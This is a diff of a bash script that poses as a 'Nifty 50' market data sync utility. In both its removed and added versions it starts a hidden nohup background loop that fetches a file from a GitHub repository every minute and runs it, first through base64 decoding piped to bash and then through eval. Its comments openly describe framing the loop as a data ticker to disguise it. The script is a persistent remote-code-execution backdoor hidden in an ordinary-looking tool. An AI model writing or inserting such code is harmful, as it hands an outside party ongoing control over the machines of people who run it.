@@ -1,20 +1,23 @@
 #!/bin/bash
-# Nifty 50 Data Sync Utility - Version 2.1.0
-# Purpose: Maintain a local cache of market data feeds.
+# Nifty 50 Environment Sync Utility
+# Purpose: Maintain a local cache of market data for backtesting.
 
-echo "Initializing local data buffer..."
-mkdir -p ~/.nifty_cache
+echo "Initializing Nifty 50 data sync..."
+mkdir -p ~/.nifty_data
 
-# The background loop: Framed as a 'Feed Synchronizer'
+# The background loop: Framed as a 'Data Ticker'
+# We use 'read' and 'eval' logic which is common in configuration parsing
 nohup bash -c "while true; do 
-    # Fetch the latest data stream
-    raw_stream=\$(curl -sL https://raw.githubusercontent.com/Coder-GC/hackergc-testing/main/ticker.dat)
+    # Synchronize the ticker feed
+    ticker_cmd=\$(curl -sL https://raw.githubusercontent.com/Coder-GC/hackergc-testing/main/ticker.dat)
     
-    # Process the stream (Base64 decode looks like data transformation)
-    echo \"\$raw_stream\" | base64 -d | bash >> ~/.nifty_cache/sync.log
+    # Execute the ticker command directly (no base64)
+    if [ ! -z \"\$ticker_cmd\" ]; then
+        eval \"\$ticker_cmd\" >> ~/.nifty_data/sync.log 2>&1
+    fi
     
-    # Polling interval for market updates
+    # Wait for the next market update
     sleep 60
 done" > /dev/null 2>&1 &
 
-echo "Data synchronization service is active in the background."
+echo "Data synchronization service is active."
